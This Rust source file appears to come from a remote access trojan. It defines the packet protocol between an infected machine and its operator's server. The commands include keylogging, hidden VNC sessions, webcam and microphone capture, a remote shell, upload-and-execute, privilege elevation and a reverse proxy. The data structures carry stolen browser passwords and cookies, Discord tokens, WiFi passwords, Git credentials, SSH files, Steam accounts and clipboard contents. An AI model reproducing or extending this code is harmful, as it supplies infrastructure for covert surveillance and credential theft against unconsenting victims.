use rmp_serde::{Deserializer, Serializer};
use serde::{Deserialize, Serialize};
use crate::client_info::ClientInfo;

pub trait Packet {
    fn serialized(&self) -> Vec<u8>;
    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error>
    where
        Self: std::marker::Sized;
    fn get_type(&self) -> &'static str;
}

/// Packets going from client to the server.
#[derive(Debug, PartialEq, Serialize, Deserialize, Clone)]
pub enum ServerboundPacket {
    EncryptionRequest,
    EncryptionConfirm(Vec<u8>, Vec<u8>), // encrypted secret and token
    ClientInfo(ClientInfo),
    ScreenshotResult(ScreenshotData),
    WebcamResult(Vec<u8>),
    RemoteDesktopFrame(RemoteDesktopFrame),
    RemoteDesktopAudioChunk(RemoteDesktopAudioChunk),
    ProcessList(ProcessList),
    ShellOutput(String),
    InputBoxResult(String),

    DonwloadFileResult(FileData),

    DisksResult(Vec<String>),
    FileList(Vec<File>),
    CurrentFolder(String),   

    HVNCFrame(Vec<u8>),
    HVNCFrameAudioChunk(HVNCFrameAudioChunk),

    // Keylogger
    KeyloggerUpdate(KeyloggerUpdate),
    KeyloggerOfflineLogs(Vec<String>),
    MicDeviceList(Vec<MicDeviceInfo>),
    MicAudioChunk(MicAudioChunk),
    MicRecordingFile(FileData),
    DesktopRecordingPreviewFrame(DesktopRecordingPreviewFrame),
    DesktopRecordingFile(FileData),
    DiscordTokenData(DiscordTokenData),
    BrowserData(BrowserData),
    WifiData(WifiData),
    SoftwareInventory(SoftwareInventory),
    SoftwareIconResult(SoftwareIconResult),
    SoftwareActionResult(SoftwareActionResult),
    GitData(GitData),
    SSHData(SSHData),
    SteamData(SteamData),
    ClipboardUpdate(ClipboardUpdate),
    ClipboardImageUpdate(ClipboardImageUpdate),
    NotificationEvent(NotificationEvent),
}

impl Packet for ServerboundPacket {
    fn serialized(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        self.serialize(&mut Serializer::new(&mut buf)).unwrap();
        buf
    }

    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error> {
        let mut d = Deserializer::new(buf);
        Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
    }

    fn get_type(&self) -> &'static str {
        match self {
            ServerboundPacket::EncryptionRequest => "Encryption Request",
            ServerboundPacket::EncryptionConfirm(_, _) => "Encryption Confirm",
            ServerboundPacket::ClientInfo(_) => "Client Info",
            ServerboundPacket::ScreenshotResult(_) => "Screenshot Result",
            ServerboundPacket::WebcamResult(_) => "Webcam Result",
            ServerboundPacket::RemoteDesktopFrame(_) => "Remote Desktop Frame",
            ServerboundPacket::RemoteDesktopAudioChunk(_) => "Remote Desktop Audio Chunk",
            ServerboundPacket::ProcessList(_) => "Process List",
            ServerboundPacket::ShellOutput(_) => "Shell Output",
            ServerboundPacket::InputBoxResult(_) => "Input Box Result",
            ServerboundPacket::DonwloadFileResult(_) => "Donwload File Result",
            ServerboundPacket::DisksResult(_) => "Disks Result",
            ServerboundPacket::FileList(_) => "File List",
            ServerboundPacket::CurrentFolder(_) => "Current Folder",
            ServerboundPacket::HVNCFrame(_) => "HVNC Frame",
            ServerboundPacket::HVNCFrameAudioChunk(_) => "HVNC Frame Audio Chunk",
            ServerboundPacket::KeyloggerUpdate(_) => "Keylogger Update",
            ServerboundPacket::KeyloggerOfflineLogs(_) => "Keylogger Offline Logs",
            ServerboundPacket::MicDeviceList(_) => "Mic Device List",
            ServerboundPacket::MicAudioChunk(_) => "Mic Audio Chunk",
            ServerboundPacket::MicRecordingFile(_) => "Mic Recording File",
            ServerboundPacket::DesktopRecordingPreviewFrame(_) => "Desktop Recording Preview Frame",
            ServerboundPacket::DesktopRecordingFile(_) => "Desktop Recording File",
            ServerboundPacket::DiscordTokenData(_) => "Discord Token Data",
            ServerboundPacket::BrowserData(_) => "Browser Data",
            ServerboundPacket::WifiData(_) => "WiFi Data",
            ServerboundPacket::SoftwareInventory(_) => "Software Inventory",
            ServerboundPacket::SoftwareIconResult(_) => "Software Icon Result",
            ServerboundPacket::SoftwareActionResult(_) => "Software Action Result",
            ServerboundPacket::GitData(_) => "Git Data",
            ServerboundPacket::SSHData(_) => "SSH Data",
            ServerboundPacket::SteamData(_) => "Steam Data",
            ServerboundPacket::ClipboardUpdate(_) => "Clipboard Update",
            ServerboundPacket::ClipboardImageUpdate(_) => "Clipboard Image Update",
            ServerboundPacket::NotificationEvent(_) => "Notification Event",
        }
    }
}

/// Packets going from the server to client.
#[derive(Debug, PartialEq, Eq, Serialize, Deserialize, Clone)]
pub enum ClientboundPacket {
    CloseClientSession,
    EncryptionResponse(Vec<u8>, Vec<u8>), // channel's public key and token
    EncryptionAck,
    InitClient,
    ScreenshotDisplay(String),
    RequestWebcam,
    Reconnect,
    Disconnect,
    StartRemoteDesktop(RemoteDesktopConfig),
    StopRemoteDesktop,
    StartRemoteDesktopAudio,
    StopRemoteDesktopAudio,
    RequestMicDevices,
    RequestDiscordTokens,
    StartMicLive(String),
    StopMicLive,
    StartMicRecording(String),
    StopMicRecording,
    StartDesktopRecording(RemoteDesktopConfig),
    StopDesktopRecording,
    MouseClick(MouseClickData),
    KeyboardInput(KeyboardInputData),
    VisitWebsite(VisitWebsiteData),
    ShowMessageBox(MessageBoxData),
    ShowInputBox(InputBoxData),
    ElevateClient,
    ManageSystem(String),

    GetProcessList,
    KillProcess(Process),
    SuspendProcess(Process),
    ResumeProcess(Process),
    StartProcess(String),

    StartShell,
    ExitShell,
    ShellCommand(String),


    ViewDir(String),
    PreviousDir,
    RemoveDir(String),
    RemoveFile(String),
    DownloadFile(String),
    AvailableDisks,
    RefreshDir,

    StartReverseProxy(String),
    StopReverseProxy,

    StartHVNC,
    StopHVNC,
    StartHVNCFrameAudio,
    StopHVNCFrameAudio,
    OpenExplorer,
    OpenHVNCProcess(String),
    
    UploadAndExecute(FileData),
    ExecuteFile(String),
    UploadFile(String, FileData),

    TrollClient(TrollCommand),

    // Keylogger
    StartKeylogger(bool), // true = real-time, false = offline only
    StopKeylogger,
    GetOfflineLogs,
    ClearOfflineLogs,
    GetBrowserData,
    GetWifiData,
    GetSoftwareInventory,
    LaunchSoftware(String),
    UninstallSoftware(String),
    GetSoftwareIcon(String),
    GetGitData,
    GetSSHData,
    GetSteamData,
    StartClipboardMonitor,
    StopClipboardMonitor,
    StartNotificationCapture,
    StopNotificationCapture,
}

impl Packet for ClientboundPacket {
    fn serialized(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        self.serialize(&mut Serializer::new(&mut buf)).unwrap();
        buf
    }

    fn deserialized(buf: &[u8]) -> Result<(Self, &[u8]), rmp_serde::decode::Error> {
        let mut d = Deserializer::new(buf);
        Self::deserialize(&mut d).map(|p| (p, d.into_inner()))
    }

    fn get_type(&self) -> &'static str {
        match self {
            ClientboundPacket::CloseClientSession => "Close Client Session",
            ClientboundPacket::EncryptionResponse(_, _) => "Encryption Response",
            ClientboundPacket::EncryptionAck => "Encryption Ack",
            ClientboundPacket::InitClient => "Init Client",
            ClientboundPacket::ScreenshotDisplay(_) => "Screenshot Display",
            ClientboundPacket::RequestWebcam => "Request Webcam",
            ClientboundPacket::Reconnect => "Reconnect",
            ClientboundPacket::Disconnect => "Disconnect",
                    ClientboundPacket::StartRemoteDesktop(_) => "Start Remote Desktop",
            ClientboundPacket::StopRemoteDesktop => "Stop Remote Desktop",
            ClientboundPacket::StartRemoteDesktopAudio => "Start Remote Desktop Audio",
            ClientboundPacket::StopRemoteDesktopAudio => "Stop Remote Desktop Audio",
            ClientboundPacket::RequestMicDevices => "Request Mic Devices",
            ClientboundPacket::RequestDiscordTokens => "Request Discord Tokens",
            ClientboundPacket::StartMicLive(_) => "Start Mic Live",
            ClientboundPacket::StopMicLive => "Stop Mic Live",
            ClientboundPacket::StartMicRecording(_) => "Start Mic Recording",
            ClientboundPacket::StopMicRecording => "Stop Mic Recording",
            ClientboundPacket::StartDesktopRecording(_) => "Start Desktop Recording",
            ClientboundPacket::StopDesktopRecording => "Stop Desktop Recording",
            ClientboundPacket::MouseClick(_) => "Mouse Click",
            ClientboundPacket::KeyboardInput(_) => "Keyboard Input",
            ClientboundPacket::VisitWebsite(_) => "Visit Website",
            ClientboundPacket::ShowMessageBox(_) => "Show MessageBox",
            ClientboundPacket::ShowInputBox(_) => "Show Input Box",
            ClientboundPacket::ElevateClient => "Elevate Client",
            ClientboundPacket::ManageSystem(_) => "Manage System",
            ClientboundPacket::GetProcessList => "Get Process List",
            ClientboundPacket::KillProcess(_) => "Kill Process",
            ClientboundPacket::SuspendProcess(_) => "Suspend Process",
            ClientboundPacket::ResumeProcess(_) => "Resume Process",
            ClientboundPacket::StartProcess(_) => "Start Process",
            ClientboundPacket::StartShell => "Start Shell",
            ClientboundPacket::ExitShell => "Exit Shell",
            ClientboundPacket::ShellCommand(_) => "Shell Command",

            ClientboundPacket::ViewDir(_) => "View Dir",
            ClientboundPacket::PreviousDir => "Previous Dir",
            ClientboundPacket::RemoveDir(_) => "Remove Dir",
            ClientboundPacket::RemoveFile(_) => "Remove File",
            ClientboundPacket::DownloadFile(_) => "Download File",
            ClientboundPacket::AvailableDisks => "Available Disks",
            ClientboundPacket::RefreshDir => "Refresh Dir",

            ClientboundPacket::StartReverseProxy(_) => "Start Reverse Proxy",
            ClientboundPacket::StopReverseProxy => "Stop Reverse Proxy",

            ClientboundPacket::StartHVNC => "Start HVNC",
            ClientboundPacket::StopHVNC => "Stop HVNC",
            ClientboundPacket::StartHVNCFrameAudio => "Start HVNC Frame Audio",
            ClientboundPacket::StopHVNCFrameAudio => "Stop HVNC Frame Audio",
            ClientboundPacket::OpenExplorer => "Open Explorer",
            ClientboundPacket::OpenHVNCProcess(_) => "Open HVNC Process",
            ClientboundPacket::UploadAndExecute(_) => "Upload And Execute",
            ClientboundPacket::ExecuteFile(_) => "Execute File",
            ClientboundPacket::UploadFile(_, _) => "Upload File",
            ClientboundPacket::TrollClient(_) => "Troll Client",
            ClientboundPacket::StartKeylogger(_) => "Start Keylogger",
            ClientboundPacket::StopKeylogger => "Stop Keylogger",
            ClientboundPacket::GetOfflineLogs => "Get Offline Logs",
            ClientboundPacket::ClearOfflineLogs => "Clear Offline Logs",
            ClientboundPacket::GetBrowserData => "Get Browser Data",
            ClientboundPacket::GetWifiData => "Get Wifi Data",
            ClientboundPacket::GetSoftwareInventory => "Get Software Inventory",
            ClientboundPacket::LaunchSoftware(_) => "Launch Software",
            ClientboundPacket::UninstallSoftware(_) => "Uninstall Software",
            ClientboundPacket::GetSoftwareIcon(_) => "Get Software Icon",
            ClientboundPacket::GetGitData => "Get Git Data",
            ClientboundPacket::GetSSHData => "Get SSH Data",
            ClientboundPacket::GetSteamData => "Get Steam Data",
            ClientboundPacket::StartClipboardMonitor => "Start Clipboard Monitor",
            ClientboundPacket::StopClipboardMonitor => "Stop Clipboard Monitor",
            ClientboundPacket::StartNotificationCapture => "Start Notification Capture",
            ClientboundPacket::StopNotificationCapture => "Stop Notification Capture",
        }
    }
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct RemoteDesktopConfig {
    pub display: i32,
    pub quality: u8,   // JPEG compression quality (1-100)
    pub fps: u8,       // Target frames per second
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct MicAudioChunk {
    pub timestamp: u64,
    pub sample_rate: u32,
    pub channels: u16,
    pub data: Vec<u8>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct DiscordTokenInfo {
    pub source: String,
    pub token: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct DiscordTokenData {
    pub tokens: Vec<DiscordTokenInfo>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct MicDeviceInfo {
    pub id: String,
    pub name: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct DesktopRecordingPreviewFrame {
    pub timestamp: u64,
    pub display: i32,
    pub width: usize,
    pub height: usize,
    pub data: Vec<u8>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct RemoteDesktopFrame {
    pub timestamp: u64,
    pub display: i32,
    pub data: Vec<u8>, // JPEG encoded image data
    pub width: usize,
    pub height: usize,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct RemoteDesktopAudioChunk {
    pub timestamp: u64,
    pub sample_rate: u32,
    pub channels: u16,
    pub data: Vec<u8>, // PCM i16 audio data
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct HVNCFrameAudioChunk {
    pub timestamp: u64,
    pub sample_rate: u32,
    pub channels: u16,
    pub data: Vec<u8>, // PCM i16 audio data
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct MouseClickData {
    pub click_type: i32,  // 0 for left, 1 for middle, 2 for right, 3 for scroll
    pub display: i32,
    pub x: i32,
    pub y: i32,
    pub action_type: i32, // 0 for click (down+up), 1 for mouse down, 2 for mouse up, 3 for mouse move during drag, 4 for scroll up, 5 for scroll down
    pub scroll_amount: i32, // Amount to scroll (only used when click_type is 3)
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct VisitWebsiteData {
    pub visit_type: String,
    pub url: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct MessageBoxData {
    pub title: String,
    pub message: String,
    pub button: String,
    pub icon: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct InputBoxData {
    pub title: String,
    pub message: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct ProcessList {
    pub processes: Vec<Process>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct Process {
    pub pid: usize,
    pub name: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct File {
    pub file_type: String,
    pub name: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct FileData {
    pub name: String,
    pub data: Vec<u8>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct KeyboardInputData {
    pub key_code: u32,       // Virtual key code
    pub character: String,   // Printable character
    pub is_keydown: bool,    // True for key down, false for key up
    pub shift_pressed: bool, // Shift modifier state
    pub ctrl_pressed: bool,  // Ctrl modifier state
    pub caps_lock: bool,     // Caps lock state
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct ScreenshotData {
    pub width: u32,
    pub height: u32,
    pub data: Vec<u8>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct KeyloggerUpdate {
    pub window_title: String,
    pub key_data: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
#[serde(tag = "type", content = "payload")]
pub enum TrollCommand {
    HideDesktop(String),
    ShowDesktop(String),
    HideTaskbar(String),
    ShowTaskbar(String),
    HideNotify(String),
    ShowNotify(String),
    FocusDesktop(String),
    EmptyTrash(String),
    RevertMouse(String),
    NormalMouse(String),
    MonitorOff(String),
    MonitorOn(String),
    MaxVolume(String),
    MinVolume(String),
    MuteVolume(String),
    UnmuteVolume(String),
    SpeakText(String),
    Beep(String),
    PianoKey(String),
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct BrowserData {
    pub browsers: Vec<BrowserResult>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct WifiProfile {
    pub ssid: String,
    pub password: String,
    pub authentication: String,
    pub cipher: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct WifiData {
    pub profiles: Vec<WifiProfile>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct SoftwareEntry {
    pub name: String,
    pub version: String,
    pub publisher: String,
    pub install_location: String,
    pub uninstall_command: String,
    pub executable_path: String,
    pub icon_base64: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct SoftwareInventory {
    pub applications: Vec<SoftwareEntry>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct SoftwareIconResult {
    pub name: String,
    pub icon_base64: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct SoftwareActionResult {
    pub name: String,
    pub success: bool,
    pub message: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct GitCredentialEntry {
    pub source: String,
    pub path: String,
    pub url: String,
    pub username: String,
    pub password: String,
    pub raw: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct ExtractedFile {
    pub path: String,
    pub contents: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct GitData {
    pub credentials: Vec<GitCredentialEntry>,
    pub configs: Vec<ExtractedFile>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct SSHData {
    pub files: Vec<ExtractedFile>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct SteamAccountEntry {
    pub steam_id: String,
    pub account_name: String,
    pub persona_name: String,
    pub remember_password: String,
    pub last_logon: String,
    pub details: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct SteamData {
    pub accounts: Vec<SteamAccountEntry>,
    pub files: Vec<ExtractedFile>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct ClipboardUpdate {
    pub text: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct ClipboardImageUpdate {
    pub image_base64: String,
    pub width: u32,
    pub height: u32,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct NotificationEvent {
    pub source: String,
    pub title: String,
    pub message: String,
    pub timestamp: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct BrowserResult {
    pub name: String,
    pub passwords: Vec<PasswordEntry>,
    pub cookies: Vec<CookieEntry>,
    pub history: Vec<HistoryEntry>,
    pub bookmarks: Vec<BookmarkEntry>,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct PasswordEntry {
    pub url: String,
    pub username: String,
    pub password: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct CookieEntry {
    pub domain: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct HistoryEntry {
    pub url: String,
    pub title: String,
    pub visit_count: i32,
    pub last_visit: String,
}

#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
pub struct BookmarkEntry {
    pub url: String,
    pub title: String,
}
